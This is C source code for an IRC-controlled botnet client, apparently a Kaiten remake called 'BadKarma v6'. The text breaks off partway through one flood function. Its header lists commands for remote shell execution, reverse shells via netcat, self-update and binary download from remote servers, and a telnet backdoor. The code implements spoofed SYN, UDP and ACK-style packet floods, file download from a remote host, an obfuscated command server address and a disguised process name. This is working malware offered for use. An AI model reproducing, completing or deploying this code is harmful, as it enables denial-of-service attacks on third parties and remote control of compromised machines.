/*******************************************************************************
 *  oooooo  o                      .oPYo.  o             ooooo                 *
 *     d'                         8       8               8                    *
 *    d'  o8 .oPYo. .oPYo. o    o `Yooo. o8P.oPYo. oPYo.  8  o    o `o  o'     *
 *   d'    8 8    8 8    8 8    8     `8  8 .oooo8 8  `'  8  8    8  `bd'      *
 *  d'     8 8    8 8    8 8    8      8  8 8    8 8      8  8    8  d'`b      *
 * dooooo  8 `YooP8 `YooP8 `YooP8 `YooP'  8 `YooP8 8      8  `YooP' o'  `o     *
 *.......:..:....8 :....8 :....8 :.....::..:.....:..:::::..::.....:..:::..     *
 *::::::::::::ooP'.::ooP'.::ooP'.:::::::::::::::::::::::::::::::::::::::::     *
 *::::::::::::...::::...::::...:::::::::::::::::::::::::::::::::::::::::::     *
 ***************************************************************************** *
 * This is a remake of Kaiten, hacked together from various versions scattered *
 * throughout cyberspace. New features include a variety of awesome shell one- *
 * liners, ability to upgrade the bot over http (via gcc or static binary), a  *
 * feature called "HackPkg" that installs binaries without dependencies like   *
 * wget or tftp, and more! Tip: run GETBB <tftp ip> first to get the most out  *
 * of this bot (it will install to /var/bin, which is almost always writable). *
 * The LOCKUP command will kill telnetd and run a backdoor of your choice (for *
 * simplicity we assume you will run it on port 23). This bot is updated often,*
 * so check back frequently for new killer features and ddos tools. In memory  *
 * of David Bowie, because he was an awesome musician and passed during the    *
 * early development of this bot. By ShellzRuS and all the other developers    *
 * that have worked on Kaiten over the last 20 years.                          *
 *                                                                             *
 *        "Hacking on kaiten is a right of passage" --Kod                      *
 *******************************************************************************
 *   This is a IRC based distributed denial of service client.  It connects to *
 * the server specified below and accepts commands via the channel specified.  *
 * The syntax is:                                                              *
 *       !<nick> <command>                                                     *
 * You send this message to the channel that is defined later in this code.    *
 * Where <nick> is the nickname of the client (which can include wildcards)    *
 * and the command is the command that should be sent.  For example, if you    *
 * want to tell all the clients with the nickname starting with N, to send you *
 * the help message, you type in the channel:                                  *
 *       !N* HELP                                                              *
 * That will send you a list of all the commands.  You can also specify an     *
 * astrick alone to make all client do a specific command:                     *
 *       !* SH uname -a                                                        *
 * There are a number of commands that can be sent to the client:              *
 *       PAN <target> <port> <secs>    = A SYN flooder                         *
 *       UDP <target> <port> <secs>    = An UDP flooder                        *
 *       UNKNOWN <target> <secs>       = Another non-spoof udp flooder         *
 *       RANDOMFLOOD <ip><port><sec>   = Syn/Ack Flooder                       *
 *       SYNFLOOD <ip> <port> <sec>    = Another Syn Flooder                   *
 *       NSACKFLOOD <ip> <port> <sec>  = New Ack Flooder                       *
 *       NSSYNFLOOD<ip> <port> <sec>   = New Syn Flooder                       *
 *       ACKFLOOD <ip> <port> <sec>    = Ack Flooder                           *
 *       NICK <nick>                   = Changes the nick of the client        *
 *       SERVER <server>               = Changes servers                       *
 *       GETSPOOFS                     = Gets the current spoofing             *
 *       SPOOFS <subnet>               = Changes spoofing to a subnet          *
 *       DISABLE                       = Disables all packeting from this bot  *
 *       ENABLE                        = Enables all packeting from this bot   *
 *       KILL                          = Kills the knight                      *
 *       GET <http address> <save as>  = Downloads a file off the web          *
 *       VERSION                       = Requests version of knight            *
 *       KILLALL                       = Kills all current packeting           *
 *       HELP                          = Displays this                         *
 *       IRC <command>                 = Sends this command to the server      *
 *       SH <command>                  = Executes a command                    *
 *       BASH <command>                = Run a bash command                    *
 *       ISH <command>                 = Interactive SH (via privmsg)          *
 *       SHD <command>                 = Daemonize command                     *
 *       UPDATE <http://server/bot>    = Update this bot                       *
 *       HACKPKG <http://server/bin>   = Install binary (no dependencies)      *
 *       RSHELL <ip port>              = Equates to nohup nc ip port           *
 *       SYSINFO                       = Get system information                *
 * Remember, all these commands must be prefixed by a ! and the nickname that  *
 * you want the command to be sent to (can include wildcards). There are no    *
 * spaces in between the ! and the nickname, and there are no spaces before    *
 * the !                                                                       *
 *                                                                             *
 *                               - contem on efnet                             *
 *******************************************************************************/


////////////////////////////////////////////////////////////////////////////////
//                                EDIT THESE                                  //
////////////////////////////////////////////////////////////////////////////////
#undef STARTUP			// Overwrite /etc/init.d and start on startup
#undef IDENT			// IRC ident - Only enable this if you absolutely have to
#define FAKENAME "bioset"	// Fork and change process name to this after launch
#define CHAN "#ziggy"	        // Channel to join
#define KEY "null"		// The key of the channel (if not using encirc)
#define PORT 6667  // The port that the ircd is listening on
#define enchttpserver "$7?*$s7<F" // Where to download binaries from (encirc)
#undef httpserver //   Where to download binaries from (non enc)
#define enc_passwd "$7$7" // encd channel password
#define encirc "1"		// Whether or not to use the encode/encirc
#undef dispass // leave alone
#define enc_dispass "7$7" // This is the password to enable/disable the bots - now it's hardcoded
char arch[] = "xXxXx";		// Target architecture of this build
char botversion[] = "BadKarma v6 Feb 2017"; // Version of this bot
int numservers=1;		// Must change this to equal number of servers down there
char *servers[] = {		// List the servers in that format, always end in (void*)0
	"$7?*$s7<F", // localhost (run ./hide -encode 'yourserver.com')
	//"\")$$@yvuq$<yq\"",
        (void*)0
};



#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <strings.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

//////////////////////////////////////////////////////////////////////////////
//                There's more stuff to edit down there... *                 //
////////////////////////////////////////////////////////////////////////////////



char decodedsrv[512], decodedpsw[32];
int sock,changeservers=0;
unsigned int *pids, csum=0, actualparent;
char *server, *chan, *key, *nick, *ident, *user,  disabled=0, execfile[256];


//unsigned int *pids;
unsigned long spoofs=0, spoofsm=0, numpids=0;
int strwildmatch(const char* pattern, const char* string) {
	switch(*pattern) {
		case '\0': return *string;
		case '*': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
		case '?': return !(*string && !strwildmatch(pattern+1, string+1));
		default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern+1, string+1));
	}
}
int Send(int sock, char *words, ...) {
        static char textBuffer[1024];
        va_list args;
        va_start(args, words);
        vsprintf(textBuffer, words, args);
        va_end(args);
        return write(sock,textBuffer,strlen(textBuffer));
}



int mfork(char *sender) {
	unsigned int parent, *newpids, i;
	if (disabled == 1) {
		Send(sock,"NOTICE %s :Unable to comply.\n",sender);
		return 1;
	}
	parent=fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
	for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
	newpids[numpids-1]=parent;
	free(pids);
	pids=newpids;
	return parent;
}
unsigned long getspoof() {
	if (!spoofs) return rand();
	if (spoofsm == 1) return ntohl(spoofs);
	return ntohl(spoofs+(rand() % spoofsm)+1);
}

// Declare a void function
void decode();
void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *makestring() {
	char *tmp;
	int len=(rand()%5)+4,i;
 	FILE *file;
	tmp=(char*)malloc(len+1);
 	memset(tmp,0,len+1);
 	if ((file=fopen("/usr/share/dict/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
	else {
		int a=((rand()*rand())%45402)+1;
		char buf[1024];
		for (i=0;i<a;i++) fgets(buf,1024,file);
		memset(buf,0,1024);
		fgets(buf,1024,file);
		filter(buf);
		memcpy(tmp,buf,len);
		fclose(file);
	}
	return tmp;
}
void identd() {
        int sockname,sockfd,sin_size,tmpsock,i;
        struct sockaddr_in my_addr,their_addr;
        char szBuffer[1024];
        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
        my_addr.sin_family = AF_INET;
        my_addr.sin_port = htons(113);
        my_addr.sin_addr.s_addr = INADDR_ANY;
        memset(&(my_addr.sin_zero), 0, 8);
        if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) return;
        if (listen(sockfd, 1) == -1) return;
        if (fork() == 0) return;
        sin_size = sizeof(struct sockaddr_in);
        if ((tmpsock = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) exit(0);
        for(;;) {
                fd_set bla;
                struct timeval timee;
                FD_ZERO(&bla);
                FD_SET(tmpsock,&bla);
                timee.tv_sec=timee.tv_usec=60;
                if (select(tmpsock + 1,&bla,(fd_set*)0,(fd_set*)0,&timee) < 0) exit(0);
                if (FD_ISSET(tmpsock,&bla)) break;
        }
        i = recv(tmpsock,szBuffer,1024,0);
        if (i <= 0 || i >= 20) exit(0);
        szBuffer[i]=0;
        if (szBuffer[i-1] == '\n' || szBuffer[i-1] == '\r') szBuffer[i-1]=0;
        if (szBuffer[i-2] == '\n' || szBuffer[i-2] == '\r') szBuffer[i-2]=0;
	Send(tmpsock,"%s : USERID : UNIX : %s\n",szBuffer,ident);
        close(tmpsock);
        close(sockfd);
        exit(0);
}
long pow(long a, long b) {
        if (b == 0) return 1;
        if (b == 1) return a;
        return a*pow(a,b-1);
}
u_short in_cksum(u_short *addr, int len) {
        register int nleft = len;
        register u_short *w = addr;
        register int sum = 0;
        u_short answer =0;
        while (nleft > 1) {
                sum += *w++;
                nleft -= 2;
        }
        if (nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w;
                sum += answer;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return(answer);
}
void get(int sock, char *sender, int argc, char **argv) {
        int sock2,i,d;
        struct sockaddr_in server;
        unsigned long ipaddr;
        char buf[1024];
        FILE *file;
        unsigned char bufm[4096];
        if (mfork(sender) != 0) return;
        if (argc < 2) {
                Send(sock,"NOTICE %s :GET <host> <save as>\n",sender);
                exit(0);
        }
        if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                Send(sock,"NOTICE %s :Unable to create socket.\n",sender);
                exit(0);
        }
        if (!strncmp(argv[1],"http://",7)) strcpy(buf,argv[1]+7);
        else strcpy(buf,argv[1]);
        for (i=0;i<strlen(buf) && buf[i] != '/';i++);
        buf[i]=0;
        server.sin_family = AF_INET;
        server.sin_port = htons(80);
        if ((ipaddr = inet_addr(buf)) == -1) {
                struct hostent *hostm;
                if ((hostm=gethostbyname(buf)) == NULL) {
                        Send(sock,"NOTICE %s :Unable to resolve address.\n",sender);
                        exit(0);
                }
                memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
        }
        else server.sin_addr.s_addr = ipaddr;
        memset(&(server.sin_zero), 0, 8);
        if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
                Send(sock,"NOTICE %s :Unable to connect to http.\n",sender);
                exit(0);
        }

        Send(sock2,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: MozZilla/4.75 [en] (X11; U; Linux 2.2.16-3 %s)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */\x2a\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",buf+i+1,buf,arch);
        Send(sock,"NOTICE %s :Receiving file.\n",sender);
        file=fopen(argv[2],"wb");
        while(1) {
                int i;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
                        for (d+=4;d<i;d++) fputc(bufm[d],file);
                        goto done;
                }
        }
        done:
        Send(sock,"NOTICE %s :Saved as %s\n",sender,argv[2]);
        while(1) {
                int i,d;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) fputc(bufm[d],file);
        }
        fclose(file);
        close(sock2);
        exit(0);
}
void getspoofs(int sock, char *sender, int argc, char **argv) {
        unsigned long a=spoofs,b=spoofs+(spoofsm-1);
        if (spoofsm == 1) Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0]);
        else Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0],((u_char*)&b)[3],((u_char*)&b)[2],((u_char*)&b)[1],((u_char*)&b)[0]);
}
void version(int sock, char *sender, int argc, char **argv) {
        Send(sock,"NOTICE %s :%s  \n",sender,botversion);
}
void nickc(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,"NOTICE %s :NICK <nick>\n",sender);
                return;
        }
        if (strlen(argv[1]) >= 10) {
                Send(sock,"NOTICE %s :Nick cannot be larger than 9 characters.\n",sender);
                return;
        }
        Send(sock,"NICK %s\n",argv[1]);
}
/*
* New enable/disable functions. Instead of setting the password after launch, set it before compilation
*
*/

void disable(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,"NOTICE %s :DISABLE <pass>\n",sender);
                Send(sock,"NOTICE %s :Current status is: %s.\n",sender,disabled?"Disabled":"Enabled and awaiting orders");
                return;
        }
	if (disabled) {
		Send(sock,"NOTICE %s :Already disabled.\n",sender);
		return;
	} 
	decode(enc_dispass, 1);
	char *dispass = decodedpsw;
        if (! strcasecmp(dispass,argv[1])) {
                Send(sock,"NOTICE %s :Disable sucessful.\n");
                 disabled=1;
		}
	else {
        	Send(sock,"NOTICE %s :Wrong password\n",sender);
        	disabled=0;
		return;	
	}
}
void enable(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,"NOTICE %s :ENABLE <pass>\n",sender);
                Send(sock,"NOTICE %s :Current status is: %s.\n",sender,disabled?"Disabled":"Enabled and awaiting orders");
                return;
        }
	if (!disabled) {
		Send(sock,"NOTICE %s :Already enabled.\n",sender);
		return;
	}
	decode(enc_dispass, 1);
	char *dispass = decodedpsw;
	if (! strcasecmp(dispass,argv[1])) {
                disabled=0;
		Send(sock,"NOTICE %s :Password correct.\n",sender);
       } else {
		Send(sock,"NOTICE %s :Wrong password\n",sender);
		return;
	}
	
}
void spoof(int sock, char *sender, int argc, char **argv) {
        char ip[256];
        int i, num;
        unsigned long uip;
        if (argc != 1) {
                Send(sock,"NOTICE %s :Removed all spoofs\n",sender);
                spoofs=0;
                spoofsm=0;
                return;
        }
        if (strlen(argv[1]) > 16) {
                Send(sock,"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\n",sender);
                return;
        }
        strcpy(ip,argv[1]);
        if (ip[strlen(ip)-1] == '.') ip[strlen(ip)-1] = 0;
        for (i=0, num=1;i<strlen(ip);i++) if (ip[i] == '.') num++;
        num=-(num-4);
        for (i=0;i<num;i++) strcat(ip,".0");
        uip=inet_network(ip);
        if (num == 0) spoofsm=1;
        else spoofsm=pow(256,num);
        spoofs=uip;
}
struct iphdr {
        unsigned int ihl:4, version:4;
        unsigned char tos;
        unsigned short tot_len;
        unsigned short id;
        unsigned short frag_off;
        unsigned char ttl;
        unsigned char protocol;
        unsigned short check;
        unsigned long saddr;
        unsigned long daddr;
};
struct udphdr {
        unsigned short source;
        unsigned short dest;
        unsigned short len;
        unsigned short check;
};
struct tcphdr {
        unsigned short source;
        unsigned short dest;
        unsigned long seq;
        unsigned long ack_seq;
        unsigned short res1:4, doff:4;
	unsigned char fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
        unsigned short window;
        unsigned short check;
        unsigned short urg_ptr;
};
struct send_tcp {
	struct iphdr ip;
	struct tcphdr tcp;
	char buf[20];
};
struct pseudo_header {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
	char buf[20];
};
unsigned int host2ip(char *sender,char *hostname) {
        static struct in_addr i;
        struct hostent *h;
        if((i.s_addr = inet_addr(hostname)) == -1) {
                if((h = gethostbyname(hostname)) == NULL) {
                        Send(sock, "NOTICE %s :Unable to resolve %s\n", sender,hostname);
                        exit(0);
                }
                bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
        }
        return i.s_addr;
}
void udp(int sock, char *sender, int argc, char **argv) {
        unsigned int port,i=0;
        unsigned long psize,target,secs;
        struct sockaddr_in s_in;
        struct iphdr *ip;
	struct udphdr *udp;
	char buf[1500],*str;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        if (argc < 3) {
                Send(sock,"NOTICE %s :UDP <target> <port> <secs>\n",sender);
                exit(1);
        }
        target = host2ip(sender,argv[1]);
        port = atoi(argv[2]);
        secs = atol(argv[3]);
        ip=(void*)buf;
	udp=(void*)(buf+sizeof(struct iphdr));
        str=(void*)(buf+sizeof(struct iphdr)+sizeof(struct udphdr));
        memset(str,10,1500-(sizeof(struct iphdr)+sizeof(struct udphdr)));
        Send(sock,"NOTICE %s :Packeting %s.\n",sender,argv[1]);
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = 1500;
        ip->frag_off = 0;
        ip->protocol = 17;
        ip->ttl = 64;
        ip->daddr = target;
        udp->len = htons(psize);
        s_in.sin_family  = AF_INET;
        s_in.sin_addr.s_addr = target;
        for (;;) {
                udp->source = rand();
                if (port) udp->dest = htons(port);
                else udp->dest = rand();
                udp->check = in_cksum((u_short *)buf,1500);
                ip->saddr = getspoof();
                ip->id = rand();
                ip->check = in_cksum((u_short *)buf,1500);
                s_in.sin_port = udp->dest;
                sendto(get,buf,1500,0,(struct sockaddr *)&s_in,sizeof(s_in));
                if (i >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        i=0;
                }
                i++;
        }
}
void pan(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :PAN <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        Send(sock,"NOTICE %s :Panning %s.\n",sender,argv[1]);
        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 64;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.ack_seq = 0;
        send_tcp.tcp.doff = 10;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 0;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;
        dest=htons(atoi(argv[2]));
        while(1) {
                source=rand();
                if (atoi(argv[2]) == 0) dest=rand();
                saddr=getspoof();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.ip.check = 0;
                send_tcp.tcp.source = source;
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = rand();
                send_tcp.buf[9]=((char*)&check)[0];
                send_tcp.buf[10]=((char*)&check)[1];
                send_tcp.buf[11]=((char*)&check)[2];
                send_tcp.buf[12]=((char*)&check)[3];
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);
}
// Long live unknown!
void unknown(int sock, char *sender, int argc, char **argv) {
	int flag=1,fd,i;
	unsigned long secs;
	char *buf=(char*)malloc(9216);
 	struct hostent *hp;
	struct sockaddr_in in;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 2) {
                Send(sock,"NOTICE %s :UNKNOWN <target> <secs>\n",sender);
                exit(1);
        }
        secs=atol(argv[2]);
	memset((void*)&in,0,sizeof(struct sockaddr_in));
	in.sin_addr.s_addr=host2ip(sender,argv[1]);
	in.sin_family = AF_INET;
        Send(sock,"NOTICE %s :Unknowning %s.\n",sender,argv[1]);
	while(1) {
		in.sin_port = rand();
		if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
		else {
			flag=1;
			ioctl(fd,FIONBIO,&flag);
			sendto(fd,buf,9216,0,(struct sockaddr*)&in,sizeof(in));
			close(fd);
		}
                if (i >= 50) {
                        if (time(NULL) >= start+secs) break;
                        i=0;
                }
                i++;
	}
        close(fd);
	exit(0);
}


void synflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :SYNFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        Send(sock,"NOTICE %s :Flooding with TCP SYN %s.\n",sender,argv[1]);
        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 64;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.ack_seq = 0;
        send_tcp.tcp.doff = 10;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 0;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;
        dest=htons(atoi(argv[2]));
        while(1) {
                source=rand();
                if (atoi(argv[2]) == 0) dest=rand();
                saddr=getspoof();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.ip.check = 0;
                send_tcp.tcp.source = source;
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = rand();
                send_tcp.buf[9]=((char*)&check)[0];
                send_tcp.buf[10]=((char*)&check)[1];
                send_tcp.buf[11]=((char*)&check)[2];
                send_tcp.buf[12]=((char*)&check)[3];
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);
}


void nssynflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :NSSYNFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        Send(sock,"NOTICE %s :Flooding with TCP SYN %s.\n",sender,argv[1]);
        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 64;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.ack_seq = 0;
        send_tcp.tcp.doff = 10;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 0;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;
        dest=htons(atoi(argv[2]));
        while(1) {
                source=rand();
                if (atoi(argv[2]) == 0) dest=rand();
                saddr=getspoof();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.ip.check = 0;
                send_tcp.tcp.source = source;
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = rand();
                send_tcp.buf[9]=((char*)&check)[0];
                send_tcp.buf[10]=((char*)&check)[1];
                send_tcp.buf[11]=((char*)&check)[2];
                send_tcp.buf[12]=((char*)&check)[3];
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);
}

void randomflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :RANDOMFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        dest=htons(atoi(argv[2]));

        Send(sock,"NOTICE %s :Flooding with TCP SYN/ACK %s.\n",sender,argv[1]);

        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 255;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;

        while(1) {
                saddr=getspoof();
